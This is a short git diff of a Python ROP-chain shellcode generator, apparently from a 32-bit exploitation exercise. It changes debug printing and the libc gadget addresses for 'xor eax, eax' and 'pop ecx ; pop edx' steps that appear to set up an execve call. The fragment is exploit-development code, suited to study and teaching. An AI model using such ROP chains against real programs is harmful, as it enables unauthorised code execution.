@@ -1,6 +1,5 @@
 #!/usr/bin/python3
 import argparse
-import binascii
 import os, sys
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))    # For importing ROPChain
 from rop_chain import ROPChain
@@ -19,9 +18,9 @@ class GenerateShellcode:
         self.rop_chain.parse_gadgets_file()
 
     def store_word(self, word):
+        print(hex(word))
         num_bytes = 4
         reversed_bytes = word.to_bytes(num_bytes, byteorder='little')
-        print(binascii.hexlify(reversed_bytes))
 
         for i in range(num_bytes):  # Iterate over each of the four bytes in the word
             index = self.buffer_offset + num_bytes*self.buffer_word_index + i
@@ -35,8 +34,8 @@ class GenerateShellcode:
         self.store_word(libc_gadget)
 
     def get_shellcode(self):
-        self.store_gadget("xor eax, eax ; ret ;")        # 0xb7ee73f8
-        self.store_gadget("pop ecx ; pop edx ; ret ;")   # 0xb7e34c6e
+        self.store_gadget("xor eax, eax ; ret ;")        # e.g. 0xb7e98c6c
+        self.store_gadget("pop ecx ; pop edx ; ret ;")   # 0xb7e34c6c
         self.store_word(0x0b0b0b0b)
 
 
